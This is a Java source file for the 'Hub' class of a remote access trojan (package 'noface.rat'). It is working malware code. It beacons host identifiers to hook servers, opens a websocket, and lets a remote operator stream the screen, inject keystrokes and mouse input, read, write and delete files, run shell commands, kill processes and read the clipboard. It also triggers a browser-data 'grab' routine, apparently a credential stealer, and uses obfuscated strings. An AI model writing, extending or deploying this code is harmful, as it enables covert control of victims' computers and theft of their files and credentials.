package noface.rat;

import noface.config.Hook;
import noface.config.Log;
import noface.config.S;
import noface.config.Sys;

import java.awt.Robot;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

public final class Hub {

    private final Cap cap;
    private final In input;
    private final AtomicBoolean streaming = new AtomicBoolean(false);
    private final AtomicInteger fps = new AtomicInteger(25);
    private final AtomicInteger streamGen = new AtomicInteger(0);
    private final BlockingQueue<String> jobs = new LinkedBlockingQueue<>(128);
    private volatile Sock sock;
    private Thread streamThread;
    private Thread worker;
    private int backoffMs = 2000;

    public Hub() throws Exception {
        Robot bot = new Robot();
        cap = new Cap();
        input = new In(bot, cap);
        Talk.bind(this::reply);
        worker = new Thread(this::drain, S.e("cmd"));
        worker.setDaemon(true);
        worker.start();
    }

    public void runForever() {
        while (true) {
            try {
                loopOnce();
                backoffMs = 2000;
            } catch (Exception e) {
                Log.err(S.e("hub: ") + e.getMessage());
            }
            stopStream();
            try {
                Thread.sleep(backoffMs);
            } catch (InterruptedException ie) {
                Thread.currentThread().interrupt();
                return;
            }
            backoffMs = Math.min(30_000, backoffMs + 2000);
        }
    }

    private void loopOnce() throws Exception {
        String[] bases = Hook.baseList();
        String hid = Hook.hookId();
        String sec = Hook.hookSecret();
        if (bases.length == 0 || hid == null || sec == null) {
            Log.err(S.e("hub no hook"));
            return;
        }
        String hwid = Id.hwid();
        String body = "{\"" + S.e("hookId") + "\":\"" + hid + "\",\""
                + S.e("hookSecret") + "\":\"" + sec + "\",\""
                + S.e("hwid") + "\":\"" + hwid + "\",\""
                + S.e("name") + "\":\"" + jsonEsc(Sys.pc()) + "\",\""
                + S.e("os") + "\":\"" + jsonEsc(Sys.os()) + "\",\""
                + S.e("meta") + "\":{\"w\":" + cap.width() + ",\"h\":" + cap.height() + "}}";
        String resp = null;
        for (String base : bases) {
            String helloUrl = base + S.e("/api/agent/hello");
            resp = post(helloUrl, body);
            if (resp != null && resp.contains("\"ok\":true")) break;
            resp = null;
        }
        if (resp == null) {
            Log.err(S.e("hello fail"));
            return;
        }
        String ws = extract(resp, "ws");
        if (ws == null || ws.isBlank()) {
            Log.err(S.e("no ws"));
            return;
        }
        Sock s = new Sock(ws);
        sock = s;
        s.onText(this::onMsg);
        s.onClose(() -> {
            stopStream();
            Log.out(S.e("hub close"));
        });
        s.connect();
        Log.out(S.e("hub connect"));
        backoffMs = 2000;
        long lastHb = 0;
        while (s.connected()) {
            long now = System.currentTimeMillis();
            if (now - lastHb > 12000) {
                try { s.sendText("{\"op\":\"hb\"}"); } catch (Exception ignored) {}
                lastHb = now;
            }
            Thread.sleep(400);
        }
    }

    private void onMsg(String text) {
        try {
            String op = field(text, "op");
            if (op == null) return;
            switch (op) {
                case "hello" -> {}
                case "screen.start" -> {
                    float sc = num(text, "scale", 0.55f);
                    float q = num(text, "q", 0.62f);
                    int f = (int) num(text, "fps", 25);
                    cap.setScale(sc);
                    cap.setQuality(q);
                    fps.set(Math.max(8, Math.min(30, f)));
                    startStream(true);
                    reply("{\"op\":\"screen.ok\",\"w\":" + cap.width() + ",\"h\":" + cap.height() + "}");
                }
                case "screen.stop" -> {
                    stopStream();
                    reply("{\"op\":\"screen.off\"}");
                }
                case "mouse.move" -> input.move(num(text, "x", 0), num(text, "y", 0));
                case "mouse.down" -> input.click((int) num(text, "b", 1), true);
                case "mouse.up" -> input.click((int) num(text, "b", 1), false);
                case "mouse.wheel" -> input.wheel((int) num(text, "d", 0));
                case "key.down" -> input.key((int) num(text, "c", 0), true);
                case "key.up" -> input.key((int) num(text, "c", 0), false);
                case "key.type" -> input.type(field(text, "t"));
                default -> {
                    if (!jobs.offer(text)) reply("{\"op\":\"err\",\"msg\":\"" + S.e("busy") + "\"}");
                }
            }
        } catch (Exception e) {
            Log.err(S.e("cmd: ") + e.getMessage());
        }
    }

    private void drain() {
        while (true) {
            try {
                handle(jobs.take());
            } catch (InterruptedException ie) {
                Thread.currentThread().interrupt();
                return;
            } catch (Exception e) {
                Log.err(S.e("job: ") + e.getMessage());
            }
        }
    }

    private void handle(String text) {
        String op = field(text, "op");
        if (op == null) return;
        try {
            switch (op) {
                case "fs.roots" -> reply(Fs.roots());
                case "fs.list" -> reply(Fs.list(field(text, "path")));
                case "fs.get" -> reply(Fs.get(field(text, "path")));
                case "fs.put" -> reply(Fs.put(field(text, "path"), field(text, "data")));
                case "fs.del" -> reply(Fs.del(field(text, "path")));
                case "fs.mkdir" -> reply(Fs.mkdir(field(text, "path")));
                case "pow" -> reply(Pow.run(field(text, "kind")));
                case "proc.list" -> reply(Proc.list());
                case "proc.kill" -> reply(Proc.kill(field(text, "pid")));
                case "shell" -> reply(Shell.run(field(text, "cmd")));
                case "clip.get" -> reply(Clip.get());
                case "clip.set" -> reply(Clip.set(field(text, "text")));
                case "warn.show" -> {
                    boolean stay = truth(field(text, "sticky"));
                    Note.show(field(text, "title"), field(text, "text"), stay);
                    reply("{\"op\":\"warn.ok\",\"sticky\":" + stay + "}");
                }
                case "warn.hide" -> {
                    Note.hide();
                    reply("{\"op\":\"warn.off\"}");
                }
                case "talk.open" -> Talk.open();
                case "talk.msg" -> {
                    String from = field(text, "from");
                    Talk.inbound(from == null ? S.e("op") : from, field(text, "text"));
                }
                case "talk.close" -> {
                    Talk.close();
                    reply("{\"op\":\"talk.gone\"}");
                }
                case "grab" -> {
                    reply("{\"op\":\"grab.start\"}");
                    boolean ok = noface.browsers.Boot.pack(true);
                    reply(ok ? "{\"op\":\"grab.ok\"}" : "{\"op\":\"grab.busy\"}");
                }
                case "ping" -> reply("{\"op\":\"pong\"}");
                default -> {}
            }
        } catch (Exception e) {
            Log.err(S.e("job: ") + e.getMessage());
            reply("{\"op\":\"err\",\"msg\":\"" + jsonEsc(e.getMessage()) + "\"}");
        }
    }

    private static boolean truth(String v) {
        if (v == null) return false;
        String s = v.trim().toLowerCase();
        return s.equals("true") || s.equals("1") || s.equals("yes");
    }

    private void startStream(boolean force) {
        if (!force && streaming.get()) return;
        stopStream();
        streaming.set(true);
        final Sock s = sock;
        final int gen = streamGen.incrementAndGet();
        streamThread = new Thread(() -> {
            while (streaming.get() && streamGen.get() == gen && s != null && s.connected()) {
                long t0 = System.nanoTime();
                try {
                    byte[] jpg = cap.grab();
                    if (jpg != null && jpg.length > 0 && jpg.length < 6_000_000) {
                        s.sendBin(jpg);
                    }
                    long spent = (System.nanoTime() - t0) / 1_000_000L;
                    long wait = Math.max(1L, (1000L / Math.max(1, fps.get())) - spent);
                    Thread.sleep(wait);
                } catch (InterruptedException ie) {
                    Thread.currentThread().interrupt();
                    break;
                } catch (Exception e) {
                    break;
                }
            }
            if (streamGen.get() == gen) streaming.set(false);
        }, "cap");
        streamThread.setDaemon(true);
        streamThread.start();
    }

    private void stopStream() {
        streaming.set(false);
        streamGen.incrementAndGet();
        Thread t = streamThread;
        streamThread = null;
        if (t != null && t.isAlive()) {
            t.interrupt();
            try { t.join(800); } catch (Exception ignored) {}
        }
    }

    private void reply(String json) {
        try {
            Sock s = sock;
            if (s != null) s.sendText(json);
        } catch (Exception ignored) {
        }
    }

    private static String post(String url, String json) {
        try {
            java.net.HttpURLConnection conn = (java.net.HttpURLConnection) java.net.URI.create(url).toURL().openConnection();
            conn.setConnectTimeout(8000);
            conn.setReadTimeout(12000);
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty(S.e("Content-Type"), S.e("application/json"));
            byte[] body = json.getBytes(java.nio.charset.StandardCharsets.UTF_8);
            try (java.io.OutputStream os = conn.getOutputStream()) { os.write(body); }
            int code = conn.getResponseCode();
            java.io.InputStream is = code >= 400 ? conn.getErrorStream() : conn.getInputStream();
            if (is == null) return null;
            return new String(is.readAllBytes(), java.nio.charset.StandardCharsets.UTF_8);
        } catch (Exception e) {
            return null;
        }
    }

    private static String extract(String json, String key) {
        String mark = "\"" + key + "\":\"";
        int i = json.indexOf(mark);
        if (i < 0) return null;
        int a = i + mark.length();
        int b = json.indexOf('"', a);
        if (b < 0) return null;
        return json.substring(a, b).replace("\\/", "/").replace("\\u0026", "&");
    }

    private static String field(String json, String key) {
        String mark = "\"" + key + "\":\"";
        int i = json.indexOf(mark);
        if (i >= 0) {
            int a = i + mark.length();
            StringBuilder b = new StringBuilder();
            for (int p = a; p < json.length(); p++) {
                char c = json.charAt(p);
                if (c == '\\' && p + 1 < json.length()) {
                    char n = json.charAt(++p);
                    b.append(switch (n) {
                        case 'n' -> '\n';
                        case 'r' -> '\r';
                        case 't' -> '\t';
                        case '"' -> '"';
                        case '\\' -> '\\';
                        default -> n;
                    });
                    continue;
                }
                if (c == '"') break;
                b.append(c);
            }
            return b.toString();
        }
        mark = "\"" + key + "\":";
        i = json.indexOf(mark);
        if (i < 0) return null;
        int a = i + mark.length();
        while (a < json.length() && json.charAt(a) == ' ') a++;
        int b = a;
        while (b < json.length()) {
            char c = json.charAt(b);
            if (c == ',' || c == '}' || c == ']') break;
            b++;
        }
        return json.substring(a, b).trim();
    }

    private static float num(String json, String key, float def) {
        try {
            String v = field(json, key);
            if (v == null || v.isBlank()) return def;
            return Float.parseFloat(v);
        } catch (Exception e) {
            return def;
        }
    }

    private static String jsonEsc(String s) {
        if (s == null) return "";
        return s.replace("\\", "\\\\").replace("\"", "\\\"");
    }
}
